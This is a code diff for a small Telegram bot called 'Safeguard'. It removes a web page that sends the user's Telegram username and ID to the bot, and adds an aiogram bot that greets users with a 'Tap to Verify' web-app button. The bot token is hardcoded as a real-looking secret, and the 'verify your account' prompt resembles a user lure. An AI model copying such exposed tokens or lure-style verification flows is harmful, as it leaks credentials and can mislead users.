@@ -1,77 +1,29 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Safeguard - Verify Your Telegram</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            text-align: center;
-            background-color: #0a2540;
-            color: white;
-            margin: 0;
-            padding: 20px;
-        }
-        .container {
-            max-width: 400px;
-            margin: auto;
-            background: #162a4a;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
-        }
-        .logo {
-            width: 80px;
-            margin-bottom: 20px;
-        }
-        h2 {
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-        p {
-            font-size: 16px;
-            color: #aab8c2;
-        }
-        .verify-btn {
-            display: inline-block;
-            margin-top: 20px;
-            padding: 12px 24px;
-            font-size: 18px;
-            font-weight: bold;
-            color: white;
-            background: #0088cc;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: 0.3s;
-            text-decoration: none;
-        }
-        .verify-btn:hover {
-            background: #0077b6;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <img src="https://your-logo-link.com/logo.png" alt="Safeguard Logo" class="logo">
-        <h2>Welcome to Safeguard</h2>
-        <p>Click the button below to verify your Telegram account and ensure security.</p>
-        <button class="verify-btn" onclick="verifyUser()">✅ Click Here to Verify</button>
-    </div>
+from aiogram import Bot, Dispatcher, types
+from aiogram.utils import executor
 
-    <script>
-        function verifyUser() {
-            if (Telegram.WebApp.initDataUnsafe.user) {
-                let user = Telegram.WebApp.initDataUnsafe.user;
-                let userData = `User: ${user.username} (${user.id})`;
-                Telegram.WebApp.sendData(userData);
-                alert("Verification request sent!");
-            } else {
-                alert("Please open this page inside Telegram.");
-            }
-        }
-    </script>
-</body>
-</html>
+# 🔹 Replace with your actual bot token from @BotFather
+TOKEN = "7790817420:AAGUb3F1O8Se_5MUG07HFA94T-FfAOT1V8k"
+
+bot = Bot(token=TOKEN)
+dp = Dispatcher(bot)
+
+# ✅ /start command handler
+@dp.message_handler(commands=['start'])
+async def start_command(message: types.Message):
+    keyboard = types.InlineKeyboardMarkup()
+    keyboard.add(
+        types.InlineKeyboardButton(
+            text="✅ Tap to Verify", 
+            web_app=types.WebAppInfo(url="https://DrDevPig.github.io/safeguard/")
+        )
+    )
+    
+    await message.answer(
+        "Welcome to **Safeguard**!\n\nClick below to verify your account:",
+        parse_mode="Markdown",
+        reply_markup=keyboard
+    )
+
+# ✅ Start the bot
+if __name__ == "__main__":
+    executor.start_polling(dp, skip_updates=True)
